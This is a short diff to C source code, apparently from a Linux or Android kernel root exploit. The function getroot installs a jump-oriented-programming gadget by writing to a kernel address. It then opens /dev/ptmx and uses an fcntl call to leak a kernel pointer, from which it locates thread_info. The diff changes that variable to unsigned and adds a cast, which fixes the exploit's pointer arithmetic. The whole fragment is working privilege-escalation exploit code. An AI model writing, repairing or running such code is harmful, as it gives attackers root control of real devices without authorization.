@@ -346,7 +346,7 @@ int getroot(struct offsets* o)
 {
 	int ret = 1;
 	int dev;
-	long fp;
+	unsigned long fp;
 
 	printf("[+] Installing JOP\n");
 	if(write_at_address(o->check_flags, (long)o->joploc))
@@ -358,7 +358,7 @@ int getroot(struct offsets* o)
 	if((dev = open("/dev/ptmx", O_RDWR)) < 0)
 		return 1;
 
-	fp = fcntl(dev, F_SETFL, MMAP_START);
+	fp = (unsigned)fcntl(dev, F_SETFL, MMAP_START);
 	fp += KERNEL_START;
 	ti = get_thread_info(fp);
 
